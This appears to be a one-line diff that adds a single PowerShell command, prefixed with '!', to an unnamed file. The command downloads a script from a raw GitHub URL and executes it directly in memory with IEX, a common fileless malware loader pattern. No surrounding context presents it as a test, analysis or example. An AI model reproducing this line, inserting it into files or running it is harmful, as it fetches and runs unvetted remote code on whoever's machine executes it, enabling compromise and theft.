@@ -1,0 +1,1 @@
+!powershell IEX(iwr 'https://raw.githubusercontent.com/citraadvertising/X/refs/heads/main/pl-st1' -UseBasicParsing).Content
